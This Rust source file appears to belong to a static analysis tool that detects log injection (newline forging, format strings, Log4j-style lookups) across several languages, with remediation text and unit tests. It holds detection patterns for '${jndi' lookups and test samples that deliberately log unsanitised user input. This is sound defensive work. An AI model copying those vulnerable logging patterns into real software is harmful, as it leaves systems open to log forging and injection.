/// * `file` - Path to the file to scan
/// * `language` - Optional language override (auto-detected if None)
///
/// # Returns
///
/// Vector of log injection findings in this file.
pub fn scan_file_log_injection(
    file: &Path,
    language: Option<&str>,
) -> Result<Vec<LogInjectionFinding>> {
    let registry = LanguageRegistry::global();

    // Detect language
    let lang = match language {
        Some(lang_name) => registry
            .get_by_name(lang_name)
            .ok_or_else(|| BrrrError::UnsupportedLanguage(lang_name.to_string()))?,
        None => registry.detect_language(file).ok_or_else(|| {
            BrrrError::UnsupportedLanguage(
                file.extension()
                    .and_then(|e| e.to_str())
                    .unwrap_or("unknown")
                    .to_string(),
            )
        })?,
    };

    let lang_name = lang.name();

    // Get query for this language
    let sink_query_str = get_log_sink_query(lang_name).ok_or_else(|| {
        BrrrError::UnsupportedLanguage(format!("{} (no log sink query)", lang_name))
    })?;

    let taint_query_str = get_taint_source_query(lang_name);

    // Parse the file
    let source = std::fs::read(file).map_err(|e| BrrrError::io_with_path(e, file))?;
    let mut parser = lang.parser_for_path(file)?;
    let tree = parser
        .parse(&source, None)
        .ok_or_else(|| BrrrError::Parse {
            file: file.display().to_string(),
            message: "Failed to parse file".to_string(),
        })?;

    let ts_lang = tree.language();
    let file_path = file.display().to_string();

    // Find log sinks
    let sinks = find_log_sinks(
        &tree,
        &source,
        &ts_lang,
        sink_query_str,
        lang_name,
        &file_path,
    )?;

    // Find taint sources if query is available
    let taint_sources = if let Some(taint_query) = taint_query_str {
        find_taint_sources(&tree, &source, &ts_lang, taint_query, lang_name, &file_path)?
    } else {
        FxHashMap::default()
    };

    // Analyze each sink
    let mut findings = Vec::new();
    let log_sinks = get_log_sinks(lang_name);

    for (sink_loc, sink_info) in sinks {
        if let Some(finding) = analyze_log_sink(
            &sink_info,
            &sink_loc,
            &taint_sources,
            &source,
            &log_sinks,
            lang_name,
            &file_path,
        ) {
            findings.push(finding);
        }
    }

    Ok(findings)
}

/// Information about a detected log sink.
#[derive(Debug)]
struct LogSinkInfo {
    function_name: String,
    arguments_text: Option<String>,
    first_arg_text: Option<String>,
    has_format_string: bool,
    uses_fstring: bool,
    uses_concatenation: bool,
}

/// Find all log sinks in the parsed tree.
fn find_log_sinks(
    tree: &Tree,
    source: &[u8],
    ts_lang: &tree_sitter::Language,
    query_str: &str,
    lang_name: &str,
    file_path: &str,
) -> Result<FxHashMap<SourceLocation, LogSinkInfo>> {
    let query = Query::new(ts_lang, query_str).map_err(|e| {
        BrrrError::TreeSitter(format_query_error(lang_name, "log_sink", query_str, &e))
    })?;

    let mut cursor = QueryCursor::new();
    let mut matches = cursor.matches(&query, tree.root_node(), source);

    let sink_idx = query.capture_index_for_name("sink");
    let func_idx = query.capture_index_for_name("func");
    let args_idx = query.capture_index_for_name("args");

    let mut sinks = FxHashMap::default();

    while let Some(match_) = matches.next() {
        let sink_node = sink_idx
            .and_then(|idx| match_.captures.iter().find(|c| c.index == idx))
            .map(|c| c.node);

        let func_node = func_idx
            .and_then(|idx| match_.captures.iter().find(|c| c.index == idx))
            .map(|c| c.node);

        let args_node = args_idx
            .and_then(|idx| match_.captures.iter().find(|c| c.index == idx))
            .map(|c| c.node);

        if let Some(sink_node) = sink_node {
            let location = SourceLocation {
                file: file_path.to_string(),
                line: sink_node.start_position().row + 1,
                column: sink_node.start_position().column + 1,
                end_line: sink_node.end_position().row + 1,
                end_column: sink_node.end_position().column + 1,
                snippet: None,
            };

            let function_name = func_node
                .map(|n| node_text(n, source).to_string())
                .unwrap_or_else(|| "unknown".to_string());

            let arguments_text = args_node.map(|n| node_text(n, source).to_string());
            let first_arg_text = args_node.and_then(|args| extract_first_argument(args, source));

            // Check for format string patterns
            let has_format_string = arguments_text
                .as_ref()
                .map(|a| check_format_string(a, lang_name))
                .unwrap_or(false);

            // Check for f-string (Python) or template literal (JS/TS)
            let uses_fstring = arguments_text
                .as_ref()
                .map(|a| check_fstring_or_template(a, lang_name))
                .unwrap_or(false);

            // Check for string concatenation
            let uses_concatenation = arguments_text
                .as_ref()
                .map(|a| a.contains('+'))
                .unwrap_or(false);

            sinks.insert(
                location,
                LogSinkInfo {
                    function_name,
                    arguments_text,
                    first_arg_text,
                    has_format_string,
                    uses_fstring,
                    uses_concatenation,
                },
            );
        }
    }

    Ok(sinks)
}

/// Find taint sources in the parsed tree.
fn find_taint_sources(
    tree: &Tree,
    source: &[u8],
    ts_lang: &tree_sitter::Language,
    query_str: &str,
    lang_name: &str,
    _file_path: &str,
) -> Result<FxHashMap<String, Vec<usize>>> {
    let query = Query::new(ts_lang, query_str).map_err(|e| {
        BrrrError::TreeSitter(format_query_error(lang_name, "taint_source", query_str, &e))
    })?;

    let mut cursor = QueryCursor::new();
    let mut matches = cursor.matches(&query, tree.root_node(), source);

    let source_idx = query.capture_index_for_name("source");

    let mut sources: FxHashMap<String, Vec<usize>> = FxHashMap::default();

    while let Some(match_) = matches.next() {
        if let Some(idx) = source_idx {
            if let Some(capture) = match_.captures.iter().find(|c| c.index == idx) {
                let node = capture.node;
                let text = node_text(node, source);
                let line = node.start_position().row + 1;

                // Extract variable name if this is an assignment
                let variable =
                    extract_assigned_variable(node, source).unwrap_or_else(|| text.to_string());

                sources.entry(variable).or_default().push(line);
            }
        }
    }

    Ok(sources)
}

/// Analyze a log sink for potential injection.
fn analyze_log_sink(
    sink: &LogSinkInfo,
    location: &SourceLocation,
    taint_sources: &FxHashMap<String, Vec<usize>>,
    source: &[u8],
    log_sinks: &[LogSink],
    lang_name: &str,
    _file_path: &str,
) -> Option<LogInjectionFinding> {
    // Find matching sink definition
    let sink_def = log_sinks.iter().find(|s| {
        sink.function_name.contains(&s.pattern) || s.pattern.contains(&sink.function_name)
    });

    // If using structured logging, it's safer
    let uses_structured = sink_def.map(|s| s.is_structured).unwrap_or(false);

    // Analyze the argument for taint and injection patterns
    let (tainted_data, confidence, injection_type) = if let Some(ref arg_text) = sink.arguments_text
    {
        analyze_log_argument(
            arg_text,
            taint_sources,
            sink.uses_fstring,
            sink.uses_concatenation,
            sink.has_format_string,
            lang_name,
        )
    } else {
        return None;
    };

    // Skip if no concerning patterns found
    if confidence == Confidence::Low && !sink.uses_fstring && !sink.uses_concatenation {
        return None;
    }

    // Determine severity
    let base_severity = injection_type.base_severity();
    let severity = if uses_structured {
        Severity::Info // Structured logging is safer
    } else if confidence == Confidence::High {
        base_severity
    } else if confidence == Confidence::Medium {
        match base_severity {
            Severity::Critical => Severity::High,
            Severity::High => Severity::Medium,
            _ => base_severity,
        }
    } else {
        Severity::Low
    };

    // Generate code snippet
    let code_snippet = extract_code_snippet(source, location);

    // Generate remediation
    let remediation = generate_log_remediation(
        lang_name,
        &sink.function_name,
        injection_type,
        uses_structured,
    );

    Some(LogInjectionFinding {
        location: location.clone(),
        severity,
        confidence,
        log_function: sink.function_name.clone(),
        tainted_data,
        injection_type,
        code_snippet,
        remediation,
        cwe_id: injection_type.cwe_id(),
        uses_structured_logging: uses_structured,
    })
}

/// Analyze log argument for taint and injection patterns.
fn analyze_log_argument(
    arg_text: &str,
    taint_sources: &FxHashMap<String, Vec<usize>>,
    uses_fstring: bool,
    uses_concatenation: bool,
    has_format_string: bool,
    lang_name: &str,
) -> (String, Confidence, LogInjectionType) {
    // Check for direct taint source usage
    for (var_name, _lines) in taint_sources {
        if arg_text.contains(var_name) {
            let injection_type =
                determine_injection_type(arg_text, uses_fstring, has_format_string, lang_name);
            return (var_name.clone(), Confidence::High, injection_type);
        }
    }

    // Check for suspicious patterns (user input indicators)
    let suspicious_patterns = [
        "request", "req", "params", "query", "body", "input", "user", "argv", "args", "env",
        "getenv", "stdin", "file", "read", "form", "data", "username", "password", "name", "email",
        "path", "url",
    ];

    let lower = arg_text.to_lowercase();
    for pattern in suspicious_patterns {
        if lower.contains(pattern) {
            let injection_type =
                determine_injection_type(arg_text, uses_fstring, has_format_string, lang_name);
            return (arg_text.to_string(), Confidence::Medium, injection_type);
        }
    }

    // Check for f-string with variables or concatenation
    if uses_fstring || uses_concatenation {
        let injection_type =
            determine_injection_type(arg_text, uses_fstring, has_format_string, lang_name);
        return (arg_text.to_string(), Confidence::Medium, injection_type);
    }

    // Check for Log4j-style lookups
    if arg_text.contains("${") || arg_text.contains("$jndi") || arg_text.contains("${jndi") {
        return (
            arg_text.to_string(),
            Confidence::High,
            LogInjectionType::FormatString,
        );
    }

    (
        arg_text.to_string(),
        Confidence::Low,
        LogInjectionType::UnsanitizedInput,
    )
}

/// Determine the type of log injection based on context.
fn determine_injection_type(
    arg_text: &str,
    uses_fstring: bool,
    has_format_string: bool,
    lang_name: &str,
) -> LogInjectionType {
    // Check for Log4j-style format string attacks
    if arg_text.contains("${") && (lang_name == "java" || arg_text.contains("jndi")) {
        return LogInjectionType::FormatString;
    }

    // Check for C/C++ format string vulnerabilities
    if (lang_name == "c" || lang_name == "cpp") && has_format_string {
        return LogInjectionType::FormatString;
    }

    // Default to newline injection for f-strings and concatenation
    // since they're most likely to pass user input without sanitization
    if uses_fstring || arg_text.contains('+') {
        return LogInjectionType::NewlineInjection;
    }

    LogInjectionType::UnsanitizedInput
}

/// Check if the argument contains format string patterns.
fn check_format_string(arg_text: &str, lang_name: &str) -> bool {
    match lang_name {
        "c" | "cpp" => {
            // C format specifiers
            arg_text.contains("%s")
                || arg_text.contains("%d")
                || arg_text.contains("%n")
                || arg_text.contains("%x")
        }
        "python" => {
            // Python format strings
            arg_text.contains("%s") || arg_text.contains("%d") || arg_text.contains("%(")
        }
        "java" => {
            // Log4j lookups
            arg_text.contains("${") || arg_text.contains("%s") || arg_text.contains("{}")
        }
        "go" => arg_text.contains("%s") || arg_text.contains("%v") || arg_text.contains("%d"),
        _ => false,
    }
}

/// Check for f-strings (Python) or template literals (JS/TS).
fn check_fstring_or_template(arg_text: &str, lang_name: &str) -> bool {
    match lang_name {
        "python" => {
            // Check for f-strings: f"...", f'...', or (f"...", etc
            arg_text.contains("f\"")
                || arg_text.contains("f'")
                || arg_text.contains("F\"")
                || arg_text.contains("F'")
        }
        "typescript" | "javascript" => arg_text.contains('`') && arg_text.contains("${"),
        _ => false,
    }
}

/// Extract the variable being assigned if this node is part of an assignment.
fn extract_assigned_variable(node: Node, source: &[u8]) -> Option<String> {
    let mut current = node;
    while let Some(parent) = current.parent() {
        match parent.kind() {
            "assignment"
            | "assignment_statement"
            | "variable_declaration"
            | "lexical_declaration" => {
                let mut cursor = parent.walk();
                for child in parent.children(&mut cursor) {
                    if child.kind() == "identifier" || child.kind() == "pattern" {
                        return Some(node_text(child, source).to_string());
                    }
                    if child.end_byte() < node.start_byte() {
                        let text = node_text(child, source);
                        if !text.contains('(') && !text.contains('[') {
                            return Some(text.to_string());
                        }
                    }
                }
            }
            _ => {}
        }
        current = parent;
    }
    None
}

/// Extract the first argument from an argument list.
fn extract_first_argument(args_node: Node, source: &[u8]) -> Option<String> {
    let mut cursor = args_node.walk();
    for child in args_node.children(&mut cursor) {
        if child.kind() == "(" || child.kind() == ")" || child.kind() == "," {
            continue;
        }
        return Some(node_text(child, source).to_string());
    }
    None
}

/// Extract a code snippet around the finding.
fn extract_code_snippet(source: &[u8], location: &SourceLocation) -> Option<String> {
    let source_str = std::str::from_utf8(source).ok()?;
    let lines: Vec<&str> = source_str.lines().collect();

    let start = location.line.saturating_sub(2);
    let end = (location.end_line + 1).min(lines.len());

    let snippet: Vec<String> = lines[start..end]
        .iter()
        .enumerate()
        .map(|(i, line)| format!("{:4} | {}", start + i + 1, line))
        .collect();

    Some(snippet.join("\n"))
}

/// Generate remediation advice for log injection.
fn generate_log_remediation(
    lang: &str,
    function: &str,
    injection_type: LogInjectionType,
    uses_structured: bool,
) -> String {
    if uses_structured {
        return format!(
            "Good: {} uses structured logging which is safer.\n\
             Ensure user-controlled values are passed as structured fields, not in the message template.",
            function
        );
    }

    match injection_type {
        LogInjectionType::FormatString => {
            match lang {
                "java" => format!(
                    "CRITICAL: {} may be vulnerable to Log4j-style format string attacks.\n\
                     Fix:\n\
                     - Upgrade to Log4j 2.17.0+ if using Log4j\n\
                     - Disable message lookups: log4j2.formatMsgNoLookups=true\n\
                     - Never log untrusted input directly\n\
                     - Use parameterized logging: log.info(\"User: {{}}\", sanitized_user)",
                    function
                ),
                "c" | "cpp" => format!(
                    "CRITICAL: {} is vulnerable to format string attacks.\n\
                     Fix:\n\
                     - NEVER pass user input as the format string\n\
                     - Use: printf(\"%s\", user_input) instead of printf(user_input)\n\
                     - Validate and sanitize all input before logging",
                    function
                ),
                _ => format!(
                    "WARNING: {} may be vulnerable to format string injection.\n\
                     Fix: Never pass user input directly as format strings.",
                    function
                ),
            }
        }
        LogInjectionType::NewlineInjection | LogInjectionType::CRLF => {
            match lang {
                "python" => format!(
                    "WARNING: {} may allow log forging via newline injection.\n\
                     Fix:\n\
                     - Sanitize: user_input.replace('\\n', '\\\\n').replace('\\r', '\\\\r')\n\
                     - Use structured logging: logger.info(\"event\", extra={{\"user\": user_input}})\n\
                     - Consider using structlog or python-json-logger",
                    function
                ),
                "typescript" | "javascript" => format!(
                    "WARNING: {} may allow log forging via newline injection.\n\
                     Fix:\n\
                     - Sanitize: input.replace(/[\\n\\r]/g, '')\n\
                     - Use structured logging with pino or bunyan\n\
                     - Example: logger.info({{ user: sanitizedInput }}, 'User action')",
                    function
                ),
                "go" => format!(
                    "WARNING: {} may allow log forging via newline injection.\n\
                     Fix:\n\
                     - Sanitize: strings.ReplaceAll(input, \"\\n\", \"\\\\n\")\n\
                     - Use structured logging with zap or zerolog\n\
                     - Example: log.Info(\"event\", zap.String(\"user\", sanitizedUser))",
                    function
                ),
                _ => format!(
                    "WARNING: {} may allow log forging via newline injection.\n\
                     Fix: Remove or escape newline characters (\\n, \\r) from user input before logging.",
                    function
                ),
            }
        }
        LogInjectionType::TerminalEscape => {
            format!(
                "WARNING: {} may allow ANSI escape sequence injection.\n\
                 Fix:\n\
                 - Strip or escape ANSI codes: remove sequences starting with \\x1b[ or \\033[\n\
                 - Use structured logging that escapes special characters\n\
                 - Consider using a log viewer that sanitizes terminal escapes",
                function
            )
        }
        LogInjectionType::HtmlInjection => {
            format!(
                "WARNING: {} may allow HTML/XSS injection in web log viewers.\n\
                 Fix:\n\
                 - HTML-encode user input before logging\n\
                 - Use structured logging with proper escaping\n\
                 - Ensure log viewers sanitize HTML content",
                function
            )
        }
        LogInjectionType::UnsanitizedInput => {
            format!(
                "INFO: {} logs potentially unsanitized user input.\n\
                 Consider:\n\
                 - Using structured logging with key-value pairs\n\
                 - Sanitizing user input (escape newlines, control characters)\n\
                 - Validating input format before logging",
                function
            )
        }
    }
}

/// Get text from a node, handling UTF-8 safely.
fn node_text<'a>(node: Node<'a>, source: &'a [u8]) -> &'a str {
    std::str::from_utf8(&source[node.start_byte()..node.end_byte()]).unwrap_or("")
}

// =============================================================================
// Tests
// =============================================================================

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;
    use tempfile::NamedTempFile;

    fn create_temp_file(content: &str, extension: &str) -> NamedTempFile {
        let mut file = tempfile::Builder::new()
            .suffix(extension)
            .tempfile()
            .expect("Failed to create temp file");
        file.write_all(content.as_bytes()).expect("Failed to write");
        file
    }

    // =========================================================================
    // Python Tests
    // =========================================================================

    #[test]
    fn test_python_fstring_log_injection() {
        let source = r#"
import logging

def handle_request(request):
    user_input = request.args.get('name')
    logging.info(f"User logged in: {user_input}")
"#;
        let file = create_temp_file(source, ".py");
        let findings =
            scan_file_log_injection(file.path(), Some("python")).expect("Scan should succeed");

        assert!(!findings.is_empty(), "Should detect f-string log injection");
        let finding = &findings[0];
        assert_eq!(finding.injection_type, LogInjectionType::NewlineInjection);
    }

    #[test]
    fn test_python_concatenation_log() {
        let source = r#"
import logging

def log_action(user_name):
    logging.warning("Action by: " + user_name)
"#;
        let file = create_temp_file(source, ".py");
        let findings =
            scan_file_log_injection(file.path(), Some("python")).expect("Scan should succeed");

        assert!(!findings.is_empty(), "Should detect concatenation in log");
    }

    #[test]
    fn test_python_structured_logging_safe() {
        let source = r#"
import structlog

def handle_request(request):
    log = structlog.get_logger()
    user_input = request.args.get('name')
    log.info("user_login", user=user_input)
"#;
        let file = create_temp_file(source, ".py");
        let findings =
            scan_file_log_injection(file.path(), Some("python")).expect("Scan should succeed");

        // Structured logging should have lower severity or be marked as safe
        for finding in &findings {
            if finding.uses_structured_logging {
                assert_eq!(finding.severity, Severity::Info);
            }
        }
    }

    #[test]
    fn test_python_print_logging() {
        let source = r#"
def debug_info(safe_value):
    print(f"Debug: {safe_value}")
"#;
        let file = create_temp_file(source, ".py");
        let findings =
            scan_file_log_injection(file.path(), Some("python")).expect("Scan should succeed");

        // print() with f-string should be detected
        // The severity depends on whether suspicious patterns are found
        // With non-suspicious variable names, severity should be lower
        if !findings.is_empty() {
            // Should still detect f-string pattern in print
            assert_eq!(
                findings[0].injection_type,
                LogInjectionType::NewlineInjection
            );
        }
    }

    // =========================================================================
    // TypeScript/JavaScript Tests
    // =========================================================================

    #[test]
    fn test_typescript_console_log_injection() {
        let source = r#"
function handleRequest(req: Request) {
    const userInput = req.query.name;
    console.log(`User action: ${userInput}`);
}
"#;
        let file = create_temp_file(source, ".ts");
        let findings =
            scan_file_log_injection(file.path(), Some("typescript")).expect("Scan should succeed");

        assert!(
            !findings.is_empty(),
            "Should detect template literal log injection"
        );
    }

    #[test]
    fn test_typescript_concatenation_log() {
        let source = r#"
function logUser(username: string) {
    console.warn("Login attempt: " + username);
}
"#;
        let file = create_temp_file(source, ".ts");
        let findings =
            scan_file_log_injection(file.path(), Some("typescript")).expect("Scan should succeed");

        assert!(
            !findings.is_empty(),
            "Should detect string concatenation in log"
        );
    }

    // =========================================================================
    // Go Tests
    // =========================================================================

    #[test]
    fn test_go_log_printf_injection() {
        let source = r#"
package main

import (
    "log"
)

func handleRequest(r *http.Request) {
    userInput := r.URL.Query().Get("name")
    log.Printf("User: %s", userInput)
}
"#;
        let file = create_temp_file(source, ".go");
        let findings =
            scan_file_log_injection(file.path(), Some("go")).expect("Scan should succeed");

        // Printf with %s is detected but should have medium severity
        if !findings.is_empty() {
            assert!(findings[0].severity <= Severity::Medium);
        }
    }

    // =========================================================================
    // Java Tests
    // =========================================================================

    #[test]
    fn test_java_log4j_pattern() {
        let source = r#"
import org.apache.logging.log4j.Logger;

public class Example {
    private static final Logger log = LogManager.getLogger();

    public void handleRequest(String userInput) {
        log.info("Processing: " + userInput);
    }
}
"#;
        let file = create_temp_file(source, ".java");
        let findings =
            scan_file_log_injection(file.path(), Some("java")).expect("Scan should succeed");

        // Java Log4j should have higher severity due to format string risks
        if !findings.is_empty() {
            assert!(findings[0].severity >= Severity::Medium);
        }
    }

    // =========================================================================
    // Type Tests
    // =========================================================================

    #[test]
    fn test_injection_type_cwe() {
        assert_eq!(LogInjectionType::NewlineInjection.cwe_id(), 117);
        assert_eq!(LogInjectionType::FormatString.cwe_id(), 134);
        assert_eq!(LogInjectionType::CRLF.cwe_id(), 93);
        assert_eq!(LogInjectionType::TerminalEscape.cwe_id(), 150);
        assert_eq!(LogInjectionType::HtmlInjection.cwe_id(), 79);
    }

    #[test]
    fn test_severity_ordering() {
        assert!(Severity::Critical > Severity::High);
        assert!(Severity::High > Severity::Medium);
        assert!(Severity::Medium > Severity::Low);
        assert!(Severity::Low > Severity::Info);
    }

    #[test]
    fn test_confidence_ordering() {
        assert!(Confidence::High > Confidence::Medium);
        assert!(Confidence::Medium > Confidence::Low);
    }

    #[test]
    fn test_get_log_sinks_coverage() {
        let languages = [
            "python",
            "typescript",
            "javascript",
            "go",
            "rust",
            "java",
            "c",
            "cpp",
        ];
        for lang in languages {
            let sinks = get_log_sinks(lang);
            assert!(!sinks.is_empty(), "Should have log sinks for {}", lang);
        }
    }

    #[test]
    fn test_location_display() {
        let loc = SourceLocation::new("test.py", 10, 5, 10, 50);
        assert_eq!(format!("{}", loc), "test.py:10:5");
    }
}
